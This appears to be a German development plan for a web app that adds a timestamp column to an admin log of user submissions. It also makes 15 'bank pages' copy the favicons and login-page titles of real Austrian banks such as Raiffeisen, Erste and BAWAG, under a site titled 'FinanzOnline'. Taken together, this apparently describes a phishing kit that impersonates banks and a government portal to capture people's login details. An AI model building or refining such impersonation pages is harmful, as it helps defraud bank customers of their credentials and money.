

## 1. Admin Logs — Timestamp-Spalte hinzufügen

**Datei: `src/pages/AdminLogs.tsx`**

- Neue erste Spalte `Zeitpunkt` in `TableHeader` einfügen (vor Vorname)
- In jeder `TableRow` als erste `TableCell`: `new Date(sub.created_at).toLocaleString("de-AT")` — zeigt Datum + Uhrzeit
- `colSpan` von 9 auf 10 anpassen bei "Keine Einträge"

## 2. Bankseiten — Favicon + Seitentitel dynamisch setzen

Jede Bankseite bekommt ein `useEffect` das beim Mount sofort Favicon und `document.title` setzt. Die Icons aus `src/assets/` werden als Favicon verwendet — dieselben die im Dropdown auf `/` angezeigt werden.

**Technik**: Per `useEffect` ein `<link rel="icon">` Element im `<head>` setzen/ersetzen + `document.title` ändern. Beim Unmount wird das Original-Favicon wiederhergestellt.

```tsx
useEffect(() => {
  const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement
    || document.createElement("link");
  link.rel = "icon";
  link.href = bankIcon; // importiertes Asset
  document.head.appendChild(link);
  document.title = "Bank Name - Login";
  return () => { document.title = "FinanzOnline"; };
}, []);
```

**Mapping (15 Dateien):**

| Datei | Icon-Import | Titel |
|-------|------------|-------|
| `Raiffeisenbank.tsx` | `raiffeisen_bank.png` | Raiffeisen Mein ELBA |
| `ErsteBank.tsx` | `erste_bank.png` | George - Login |
| `Bawag.tsx` | `bawag_psk.png` | BAWAG eBanking |
| `BankAustria.tsx` | `bank_austria.png` | Bank Austria - Login |
| `Volksbank.tsx` | `volksbank.png` | Volksbank - Login |
| `Bank99.tsx` | `bank99.png` | bank99 - Login |
| `Easybank.tsx` | `easy_bank.png` | easybank - Login |
| `HypoNoe.tsx` | `hypo_noe.png` | HYPO NOE - Login |
| `Oberbank.tsx` | `oberbank.png` | Oberbank - Login |
| `Schelhammer.tsx` | `schelhammer.png` | Schelhammer - Login |
| `BankhausSpaengler.tsx` | `bankhaus_spaengler.png` | Bankhaus Spängler - Login |
| `Dolomitenbank.tsx` | `dolomiten_bank.png` | DolomitenBanking - Login |
| `Spardabank.tsx` | `sparda_bank.png` | Sparda Bank - Login |
| `Dadatbank.tsx` | `dadat_bank.png` | DADAT - Login |
| `Marchfelderbank.tsx` | `marchfelder_bank.png` | Marchfelder Bank - Login |

Jede Datei importiert das entsprechende Icon aus `src/assets/` und setzt es im bestehenden `useEffect` (oder einem neuen) als Favicon. Beim Verlassen der Seite wird der originale Titel zurückgesetzt.

